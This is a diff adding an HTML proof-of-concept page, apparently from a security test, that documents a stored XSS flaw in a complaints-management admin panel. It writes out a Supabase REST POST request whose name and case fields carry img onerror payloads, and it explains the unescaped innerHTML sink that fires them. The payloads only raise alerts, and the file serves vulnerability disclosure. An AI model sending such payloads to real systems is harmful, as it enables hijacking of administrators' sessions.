@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<!-- [STRIX-POC-03] Proof-of-Concept: Stored XSS in Citizen Complaints Management -->
+<!-- Target: admin/js/submissions-manager.js (renderSubmissionRow & showDetailModal) -->
+<!-- Vulnerability: CWE-79 - Stored Cross-Site Scripting -->
+<html>
+<head>
+    <title>PoC 03 - Submissions Stored XSS</title>
+</head>
+<body>
+    <h2>Reproducing Stored XSS in Admin Pengaduan</h2>
+    <p>Payload submitted via public contact form or Supabase REST API:</p>
+    <pre>
+POST /rest/v1/contact_submissions HTTP/1.1
+Host: zyhjujejtdsljlufunjh.supabase.co
+apikey: &lt;ANON_KEY&gt;
+Content-Type: application/json
+
+{
+    "name": "Budi &lt;img src=x onerror=alert('STORED-XSS-NAME')&gt;",
+    "email": "budi@example.com",
+    "phone": "08123456789",
+    "case_description": "Kasus sengketa &lt;img src=x onerror=alert('STORED-XSS-CASE')&gt;"
+}
+    </pre>
+    <p><b>Execution:</b> When the administrator opens the <b>Pengaduan & Pesan</b> tab in <code>admin/index.html</code>, the browser executes <code>renderSubmissionRow()</code> which inserts <code>${submission.name}</code> directly into <code>tbody.innerHTML</code>, firing the payload.</p>
+</body>
+</html>
